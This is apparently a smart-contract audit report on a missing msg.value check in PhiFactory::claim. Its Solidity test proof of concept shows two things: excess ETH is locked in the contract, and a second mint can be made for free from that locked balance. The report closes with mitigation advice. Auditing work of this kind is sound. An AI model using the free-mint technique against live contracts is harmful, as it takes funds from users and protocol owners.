# Vulnerability details

## Impact

The `PhiFactory::claim` function does not verify that the correct amount of ETH is provided during a claim. This oversight results in two primary issues:

1. **Unreturned Excess ETH**: Since the function does not check if `msg.value` meets or exceeds the required minting fee (`mintFee`), any extra ETH sent by users is not refunded. This excess ETH becomes locked in the contract, as there is no mechanism to return it to the caller.

2. **Unintended Free Mints**: If the `PhiFactory` contract holds ETH, a user could call the function with `msg.value = 0`, effectively allowing them to mint NFTs without paying the required fee. This happens because the function does not validate that `msg.value` matches the required `mintFee`, enabling free mints at the expense of the contract's funds.

To address these issues, the `claim` function should be updated to ensure that `msg.value` is at least equal to `mintFee` before proceeding with the minting process.

## Proof of Concept

Add the following two tests to `test/PhiFactory.t.sol`:

1. **Excess ETH Locking Test**: Verify that any excess ETH sent during an NFT claim is not refunded. In this test, claim (mint) one NFT using the signature verification method, but provide double the `totalMintFee` instead of the exact amount. The expected outcome is that the user receives 1 art token, while the extra `totalMintFee` remains locked in the `PhiFactory` contract and is not refunded to the user.

2. **Free NFT Claim Test**: Building on the previous test, first lock excess ETH into the contract as described. Then, call the `claim` function again to mint another token, this time with `msg.value` set to 0. The expected outcome is that the locked ETH is used to cover the minting fee, allowing the user to mint a new NFT for free.

```solidity
/// @notice Helper function to generate a signature to claim 1 token for the given artId
function _getSignature(uint256 artId) internal view returns (bytes memory) {
    bytes32 advanced_data = bytes32(artId);
    bytes memory signData =
        abi.encode(expiresIn, participant, referrer, verifier, artId, block.chainid, advanced_data);
    bytes32 msgHash = keccak256(signData);
    bytes32 digest = ECDSA.toEthSignedMessageHash(msgHash);
    (uint8 v, bytes32 r, bytes32 s) = vm.sign(claimSignerPrivateKey, digest);
    if (v != 27) s = s | bytes32(uint256(1) << 255);
    bytes memory signature = abi.encodePacked(r, s);
    bytes memory data =
        abi.encode(artId, participant, referrer, verifier, expiresIn, uint256(1), advanced_data, IMAGE_URL, signature);
    bytes memory dataCompressed = LibZip.cdCompress(data);
    return dataCompressed;
}

function test_claim_noRefund() public {
    _createArt(ART_ID_URL_STRING);

    uint256 phiFactoryBalanceBefore = address(phiFactory).balance;
    assertTrue(phiFactoryBalanceBefore == 0);

    uint256 participantBalanceBefore = address(participant).balance;
    uint256 artId = 1;
    bytes memory dataCompressed = _getSignature(artId);
    uint256 totalMintFee = phiFactory.getArtMintFee(artId, 1);

    vm.startPrank(participant);

    // Pass twice the amount of fees required to mint 1 token
    phiFactory.claim{ value: 2 * totalMintFee }(dataCompressed);

    // Verify that the user only received 1 token
    address artAddress = phiFactory.getArtAddress(artId);
    assertEq(IERC1155(artAddress).balanceOf(participant, 1), 1, "particpiant erc1155 balance");

    // Verify that totalMintFee got locked into the contract
    uint256 phiFactoryBalanceAfter = address(phiFactory).balance;
    assertTrue(phiFactoryBalanceAfter - phiFactoryBalanceBefore == totalMintFee);

    // User's balance was reduced by twice the totalMintFee plus an additional gas fee.
    uint256 participantBalanceAfter = address(participant).balance;
    assertTrue(participantBalanceAfter <= participantBalanceBefore - 2 * totalMintFee);

    vm.stopPrank();
}

function test_FreeClaim() public {
    _createArt(ART_ID_URL_STRING);

    uint256 artId = 1;
    bytes memory dataCompressed = _getSignature(artId);
    uint256 totalMintFee = phiFactory.getArtMintFee(artId, 1);

    vm.startPrank(participant);

    // Lock some ETH into the PhiFactory contract by minting 1 token but passing
    // twice the amount of ETH required
    phiFactory.claim{ value: 2 * totalMintFee }(dataCompressed);

    address artAddress = phiFactory.getArtAddress(artId);
    uint256 participantNFTBalanceBefore = IERC1155(artAddress).balanceOf(participant, 1);
    assertTrue(participantNFTBalanceBefore == 1);

    // Claim again passing zero value
    vm.startPrank(participant);
    phiFactory.claim{ value: 0 }(dataCompressed);

    // Verify that now the user owns 2 NFTs
    uint256 participantNFTBalanceAfter = IERC1155(artAddress).balanceOf(participant, 1);
    assertTrue(participantNFTBalanceAfter == 2);

    // Verify that the ETH held by the PhiFactory was spent to mint the NFT in behalf of the user
    uint256 phiFactoryBalanceEnd = address(phiFactory).balance;
    assertTrue(phiFactoryBalanceEnd == 0);

    vm.stopPrank();
}
```

## Recommended Mitigation Steps


Ensure that `msg.value` matches `mintFee` for both verification types, or implement a refund mechanism to return any excess ETH.
